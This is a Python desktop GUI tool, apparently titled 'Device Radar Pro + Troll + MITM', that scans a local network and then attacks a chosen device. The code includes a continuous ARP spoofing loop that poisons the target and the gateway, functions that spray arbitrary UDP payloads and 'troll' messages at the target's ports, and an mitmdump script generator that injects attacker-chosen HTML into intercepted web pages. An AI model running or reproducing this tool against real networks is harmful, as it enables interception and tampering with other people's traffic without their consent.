import os
import sys
import json
import time
import socket
import logging
import threading
import subprocess
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, simpledialog
from concurrent.futures import ThreadPoolExecutor

from scapy.all import ARP, Ether, srp, send, IP, ICMP, UDP, conf, get_if_list
# Windows-only: фильтруем WFP-адаптеры, оставляем только реальные
try:
    from scapy.arch.windows import get_windows_if_list as _gwif
    get_windows_if_list = lambda: [
        i for i in _gwif()
        if "WFP" not in i["description"] and i["name"] in get_if_list()
    ]
except ImportError:
    get_windows_if_list = lambda: []

# nmap (optional)
try:
    import nmap
except ImportError:
    nmap = None

# mitmproxy (для внешнего mitmdump)
# мы больше не используем DumpMaster внутри кода

# MAC-парсер
from manuf import MacParser

# networkx/map (optional)
try:
    import networkx as nx
    import matplotlib.pyplot as plt
    from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
except ImportError:
    nx = None

# --- Конфиг ---
CONFIG_PATH = os.path.join(os.path.dirname(__file__), "config.json")
DEFAULT_CONFIG = {
    "troll_ports":    [21,22,23,25,53,80,135,139,445,3389],
    "os_colors":      {"Windows":"#1f77b4","Apple":"#7f7f7f",
                       "Android":"#2ca02c","Unknown":"#d62728"},
    "scan_interval":  30,
    "injection_html": "<div style='position:fixed;top:0;left:0;"
                      "background:red;color:white;padding:5px;'>Injected!</div>"
}
if os.path.exists(CONFIG_PATH):
    with open(CONFIG_PATH, "r", encoding="utf-8") as f:
        cfg = json.load(f)
else:
    cfg = DEFAULT_CONFIG

TROLL_PORTS    = cfg["troll_ports"]
OS_COLORS      = cfg["os_colors"]
SCAN_INTERVAL  = cfg["scan_interval"]
HTML_INJECTION = cfg["injection_html"]

# --- Логирование ---
logger = logging.getLogger("DeviceRadar")
logger.setLevel(logging.INFO)
fh = logging.FileHandler("device_radar.log", encoding="utf-8")
fh.setFormatter(logging.Formatter("%(asctime)s %(levelname)s:%(message)s"))
logger.addHandler(fh)

class GUILogHandler(logging.Handler):
    def __init__(self, widget):
        super().__init__(); self.widget = widget
    def emit(self, record):
        msg = self.format(record)
        def append():
            self.widget.insert(tk.END, msg + "\n")
            self.widget.see(tk.END)
        self.widget.after(0, append)

class DeviceRadarApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("🔥 Device Radar Pro + Troll + MITM 🔥")
        self.configure(bg="#222")
        self.state("zoomed")
        self.protocol("WM_DELETE_WINDOW", self.on_close)
        self.bind("<F11>", lambda e: self.toggle_fullscreen())

        # State
        self.devices = []
        self.spoofing = False
        self.mitm_running = False
        self.iface = conf.iface
        self.gateway_ip = None
        self.selected = None
        self.scan_interval = SCAN_INTERVAL

        # Build UI
        self._build_styles()
        self._build_menu()
        self._build_gui()
        self._attach_gui_logger()

        # Start scanning
        self.gateway_ip = self.get_gateway()
        self.after(200, self._scan_loop)

    def _build_styles(self):
        s = ttk.Style(self); s.theme_use("clam")
        s.configure("Treeview", background="#333", fieldbackground="#333",
                    foreground="white", font=("Consolas",11))
        s.map("Treeview", background=[("selected","#555")])
        s.configure("TButton", font=("Arial",11), padding=6)
        s.configure("TLabel", background="#222", foreground="white")
        s.configure("TEntry", fieldbackground="#444", foreground="white")
        s.configure("Horizontal.TProgressbar", troughcolor="#444", background="#2a82da")

    def _build_menu(self):
        mb = tk.Menu(self)
        fm = tk.Menu(mb, tearoff=0)
        fm.add_command(label="Rescan", command=self.scan_network)
        fm.add_separator()
        fm.add_command(label="Exit",   command=self.on_close)
        mb.add_cascade(label="File",     menu=fm)
        sm = tk.Menu(mb, tearoff=0)
        sm.add_command(label="Scan Interval…", command=self._change_interval)
        mb.add_cascade(label="Settings", menu=sm)
        hm = tk.Menu(mb, tearoff=0)
        hm.add_command(label="About", command=lambda:
                       messagebox.showinfo("About","Device Radar Pro\nby AI Coder"))
        mb.add_cascade(label="Help",   menu=hm)
        self.config(menu=mb)

    def _build_gui(self):
        top = ttk.Frame(self, padding=10); top.pack(fill="x")
        # Interface selector
        ttk.Label(top, text="Interface:").pack(side="left")
        if os.name=="nt":
            opts = [f"{i['description']} ({i['name']})"
                    for i in get_windows_if_list()]
            if not opts:
                opts = get_if_list()
            default = next((o for o in opts if f"({self.iface})" in o), opts[0])
            self.iface_var = tk.StringVar(value=default)
            ttk.OptionMenu(top, self.iface_var, default, *opts,
                           command=self._on_iface_change).pack(side="left",padx=5)
        else:
            lst = get_if_list()
            self.iface_var = tk.StringVar(value=self.iface)
            ttk.OptionMenu(top, self.iface_var, self.iface, *lst,
                           command=self._on_iface_change).pack(side="left",padx=5)
        # Subnet
        ttk.Label(top, text="Subnet:").pack(side="left", padx=(15,0))
        self.subnet_var = tk.StringVar(value=self._default_subnet())
        ttk.Entry(top, textvariable=self.subnet_var, width=16).pack(side="left",padx=5)
        ttk.Button(top, text="Rescan", command=self.scan_network).pack(side="left",padx=10)
        self.pbar = ttk.Progressbar(top, mode="indeterminate", style="Horizontal.TProgressbar")
        self.pbar.pack(side="right", fill="x", expand=True)

        # Notebook
        self.nb = ttk.Notebook(self); self.nb.pack(fill="both",expand=True)
        # Devices tab
        df = ttk.Frame(self.nb); self.nb.add(df, text="Devices")
        cols = ("IP","MAC","Vendor","OS","Latency","Ports")
        self.tree = ttk.Treeview(df, columns=cols, show="headings")
        for c in cols:
            self.tree.heading(c, text=c)
            self.tree.column(c, anchor="center")
        self.tree.pack(side="left", fill="both", expand=True, padx=5, pady=5)
        self.tree.bind("<<TreeviewSelect>>", self._on_device_select)
        self.tree.bind("<Double-1>", self._copy_ip)
        sb = ttk.Scrollbar(df, orient="vertical", command=self.tree.yview)
        sb.pack(side="left", fill="y"); self.tree.configure(yscroll=sb.set)
        df_det = ttk.Frame(df, width=300); df_det.pack(side="left",fill="y",padx=10,pady=5)
        ttk.Label(df_det, text="Details:", font=("Arial",12,"bold")).pack(anchor="nw")
        self.details = tk.Text(df_det, bg="#333", fg="white", font=("Consolas",11),
                               width=30, height=15)
        self.details.pack(fill="both", expand=True)
        ctl = ttk.Frame(df_det); ctl.pack(fill="x", pady=(10,0))
        self.start_spoof_btn = ttk.Button(ctl, text="Start Spoof",
                                          command=self.start_spoof, state="disabled")
        self.start_spoof_btn.pack(side="left",padx=5)
        self.stop_spoof_btn  = ttk.Button(ctl, text="Stop Spoof",
                                          command=self.stop_spoof, state="disabled")
        self.stop_spoof_btn.pack(side="left",padx=5)

        # Network map tab
        if nx:
            nf = ttk.Frame(self.nb); self.nb.add(nf, text="Network Map")
            self.fig = plt.Figure(figsize=(5,5), dpi=100)
            self.ax  = self.fig.add_subplot(111)
            self.canvas = FigureCanvasTkAgg(self.fig, master=nf)
            self.canvas.get_tk_widget().pack(fill="both", expand=True)

        # Bottom controls
        bot = ttk.Frame(self, padding=10); bot.pack(fill="x")
        # Send Cmd
        ttk.Label(bot, text="Cmd:").pack(side="left")
        self.cmd_entry = ttk.Entry(bot, width=30); self.cmd_entry.pack(side="left",padx=5)
        self.cmd_entry.insert(0, "ping 8.8.8.8")
        ttk.Button(bot, text="Send Cmd", command=self.send_fake_packet).pack(side="left",padx=5)
        # Troll
        ttk.Label(bot, text="Troll msg:").pack(side="left",padx=(20,0))
        self.troll_entry = ttk.Entry(bot, width=30); self.troll_entry.pack(side="left",padx=5)
        self.troll_entry.insert(0, "You have been spotted 😈")
        ttk.Button(bot, text="Troll", command=self.troll_selected).pack(side="left",padx=5)
        # MITM
        self.mitm_btn = ttk.Button(bot, text="Start MITM Proxy", command=self.toggle_mitm)
        self.mitm_btn.pack(side="left", padx=20)
        ttk.Label(bot, text="Inj HTML:").pack(side="left",padx=(20,0))
        self.inject_var = tk.StringVar(value=HTML_INJECTION)
        ttk.Entry(bot, textvariable=self.inject_var, width=30).pack(side="left",padx=5)
        ttk.Button(bot, text="Apply", command=self._apply_injection).pack(side="left",padx=5)
        # Status & log
        self.status_var = tk.StringVar(value="Ready")
        ttk.Label(self, textvariable=self.status_var, relief="sunken", anchor="w").pack(fill="x",side="bottom")
        self.log = scrolledtext.ScrolledText(self, height=6, bg="#111", fg="lime", font=("Consolas",9))
        self.log.pack(fill="x", padx=10, pady=(0,5))

    def _attach_gui_logger(self):
        h = GUILogHandler(self.log)
        h.setFormatter(logging.Formatter("%(asctime)s %(levelname)s:%(message)s"))
        logger.addHandler(h)

    def _default_subnet(self):
        ip = socket.gethostbyname(socket.gethostname())
        a,b,c,_ = ip.split(".")
        return f"{a}.{b}.{c}.0/24"

    def _on_iface_change(self, val):
        if os.name=="nt" and "(" in val and val.endswith(")"):
            name = val[val.rfind("(")+1:-1]
        else:
            name = val
        self.iface = name
        conf.iface = name
        logger.info(f"Interface set to {name}")

    def _change_interval(self):
        v = simpledialog.askinteger("Scan Interval", "Seconds:",
                                    initialvalue=self.scan_interval,
                                    minvalue=5, maxvalue=3600)
        if v:
            self.scan_interval = v
            logger.info(f"Scan interval set to {v}s")

    def get_gateway(self):
        if os.name=="nt":
            try:
                out = subprocess.check_output(["route","print"], encoding="cp1251")
                for l in out.splitlines():
                    if "0.0.0.0          0.0.0.0" in l:
                        return l.split()[3]
            except:
                pass
        else:
            try:
                out = subprocess.check_output(["ip","route","show"], encoding="utf-8")
                for l in out.splitlines():
                    if l.startswith("default"):
                        return l.split()[2]
            except:
                pass
        return self._default_subnet().split("/")[0]

    def _scan_loop(self):
        self.scan_network()
        self.after(self.scan_interval*1000, self._scan_loop)

    def scan_network(self):
        self.status_var.set("Scanning…")
        logger.info("Scan start")
        self.pbar.start()
        subnet = self.subnet_var.get()

        def worker():
            try:
                # fallback iface
                iface = self.iface if self.iface in get_if_list() else conf.iface
                if iface != self.iface:
                    logger.warning("Using fallback iface %s", iface)

                pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet)
                try:
                    ans = srp(pkt, timeout=3, iface=iface, verbose=False)[0]
                except ValueError as e:
                    logger.error("srp() failed on %s: %s", iface, e)
                    ans = srp(pkt, timeout=3, iface=conf.iface, verbose=False)[0]

                nm_sc = nmap.PortScanner() if nmap else None
                devices = []
                for _, rsp in ans:
                    ip, mac = rsp.psrc, rsp.hwsrc
                    vendor = MacParser().get_manuf(mac) or "Unknown"
                    if nm_sc:
                        try:
                            sc = nm_sc.scan(hosts=ip,
                                            ports=",".join(map(str,TROLL_PORTS)),
                                            arguments="-O")
                            info = sc["scan"].get(ip, {})
                            osn = info.get("osmatch",[{}])[0].get("name","Unknown")
                            sv  = [(p, info["tcp"][p]["name"]) for p in info.get("tcp",{})]
                        except Exception as e:
                            logger.error("nmap failed for %s: %s", ip, e)
                            osn, sv = "Unknown", []
                    else:
                        osn, sv = "Unknown", []
                    lat   = self._ping(ip)
                    ports = self._scan_ports(ip)
                    devices.append({
                        "ip": ip, "mac": mac, "vendor": vendor,
                        "os": osn, "latency": lat,
                        "ports": ports, "services": sv
                    })
                self.after(0, lambda: self._update_after_scan(devices))
            except Exception as e:
                logger.exception("Error in scan thread: %s", e)
                self.after(0, lambda: self._update_after_scan([]))

        threading.Thread(target=worker, daemon=True).start()

    def _update_after_scan(self, devs):
        self.pbar.stop()
        self.devices = devs
        for iid in self.tree.get_children():
            self.tree.delete(iid)
        for d in devs:
            self.tree.insert("", tk.END, values=(
                d["ip"], d["mac"], d["vendor"], d["os"],
                f"{d['latency']} ms", ",".join(map(str,d["ports"]))
            ))
        if nx:
            try:
                G = nx.Graph(); G.add_node(self.gateway_ip)
                for d in devs:
                    G.add_node(d["ip"]); G.add_edge(self.gateway_ip, d["ip"])
                self.ax.clear()
                pos = nx.spring_layout(G)
                nx.draw(G, pos, ax=self.ax,
                        node_color=[OS_COLORS.get(d["os"],"#d62728") for d in devs],
                        with_labels=True, font_size=8)
                self.canvas.draw()
            except Exception as e:
                logger.error("Graph update failed: %s", e)

        ts = time.strftime("%H:%M:%S")
        self.status_var.set(f"{len(devs)} devices | last {ts}")
        logger.info("Scan complete")

    def _on_device_select(self, _):
        sel = self.tree.selection()
        if not sel: return
        d = self.devices[self.tree.index(sel[0])]
        self.selected = d
        self.start_spoof_btn.config(state="normal")
        info = (
            f"IP:      {d['ip']}\n"
            f"MAC:     {d['mac']}\n"
            f"Vendor:  {d['vendor']}\n"
            f"OS:      {d['os']}\n"
            f"Latency: {d['latency']} ms\n"
            f"Ports:   {','.join(map(str,d['ports']))}\n\n"
            "Services:\n" + "\n".join(f"{p}/{s}" for p,s in d['services'])
        )
        self.details.delete("1.0","end")
        self.details.insert("1.0", info)

    def _copy_ip(self, event):
        sel = self.tree.selection()
        if not sel: return
        ip = self.tree.item(sel[0], "values")[0]
        self.clipboard_clear(); self.clipboard_append(ip)
        messagebox.showinfo("Copied", f"{ip} copied")

    def _ping(self, ip):
        try:
            pkt = IP(dst=ip)/ICMP()
            t0 = time.time()
            if srp(Ether()/pkt, timeout=1, iface=self.iface, verbose=False):
                return int((time.time()-t0)*1000)
        except:
            pass
        return -1

    def _scan_ports(self, ip):
        def chk(p):
            try:
                with socket.socket() as s:
                    s.settimeout(0.5)
                    return p if s.connect_ex((ip,p))==0 else None
            except:
                return None
        with ThreadPoolExecutor(max_workers=20) as ex:
            res = list(ex.map(chk, TROLL_PORTS))
        return [p for p in res if p] or [TROLL_PORTS[0]]

    def start_spoof(self):
        if not self.selected: return
        self.spoofing = True
        self.start_spoof_btn.config(state="disabled")
        self.stop_spoof_btn.config(state="normal")
        threading.Thread(target=self._spoof_loop, daemon=True).start()
        logger.info("ARP spoofing started")

    def _spoof_loop(self):
        gw, tgt, mac = self.gateway_ip, self.selected["ip"], self.selected["mac"]
        while self.spoofing:
            send(ARP(op=2, pdst=tgt, psrc=gw, hwdst=mac),
                 iface=self.iface, verbose=False)
            send(ARP(op=2, pdst=gw,  psrc=tgt, hwdst="ff:ff:ff:ff:ff:ff"),
                 iface=self.iface, verbose=False)
            time.sleep(2)

    def stop_spoof(self):
        self.spoofing = False
        self.start_spoof_btn.config(state="normal")
        self.stop_spoof_btn.config(state="disabled")
        logger.info("ARP spoofing stopped")

    def send_fake_packet(self):
        if not self.selected: return
        cmd = self.cmd_entry.get().encode()
        ip  = self.selected["ip"]
        for p in self.selected["ports"]:
            send(IP(dst=ip)/UDP(dport=p)/cmd, iface=self.iface, verbose=False)
        logger.info("Fake packet sent to %s ports %s", ip, self.selected["ports"])

    def troll_selected(self):
        if not self.selected: return
        msg = self.troll_entry.get().encode("utf-8")
        ip  = self.selected["ip"]
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        results = []
        for p in TROLL_PORTS:
            try:
                sock.sendto(msg, (ip, p))
                results.append((p, True))
            except:
                results.append((p, False))
        ok   = [str(p) for p,ok in results if ok]
        fail = [str(p) for p,ok in results if not ok]
        report = f"Troll→{ip}\nOK: {','.join(ok)}\nFail: {','.join(fail)}"
        self.log.insert(tk.END, report + "\n"); self.log.see(tk.END)
        messagebox.showinfo("Troll report", report)

    def toggle_mitm(self):
        # если запущен — завершаем
        if self.mitm_running:
            try:
                self.mitm_proc.terminate()
            except Exception as e:
                self.log.insert(tk.END, f"[ERROR] could not stop mitmdump: {e}\n")
            else:
                self.log.insert(tk.END, "[INFO] mitmdump stopped\n")
            self.mitm_running = False
            self.mitm_btn.config(text="Start MITM Proxy")
            return

        # генерируем скрипт инъекции
        inj = self.inject_var.get().replace("'", "\\'")
        script = os.path.join(os.getcwd(), "_inject_mitm.py")
        with open(script, "w", encoding="utf-8") as f:
            f.write(f"""\
from mitmproxy import http
def response(flow: http.HTTPFlow):
    if "text/html" in flow.response.headers.get("Content-Type",""):
        html = flow.response.get_text()
        flow.response.set_text(html.replace("</body>","{inj}</body>"))
""")
        # запускаем mitmdump
        try:
            self.mitm_proc = subprocess.Popen(
                ["mitmdump", "-p", "8080", "-s", script],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        except FileNotFoundError:
            messagebox.showerror("Error","mitmdump not found, please install mitmproxy")
            return

        self.mitm_running = True
        self.mitm_btn.config(text="Stop MITM Proxy")
        self.log.insert(tk.END, "[INFO] mitmdump started on port 8080\n")
        self.log.see(tk.END)

    def _apply_injection(self):
        global HTML_INJECTION
        HTML_INJECTION = self.inject_var.get()
        messagebox.showinfo("Injection","Injection HTML updated")

    def toggle_fullscreen(self):
        self.attributes("-fullscreen", not self.attributes("-fullscreen"))

    def on_close(self):
        self.spoofing = False
        if self.mitm_running:
            try: self.mitm_proc.terminate()
            except: pass
        self.destroy()

if __name__ == "__main__":
    app = DeviceRadarApp()
    app.mainloop()
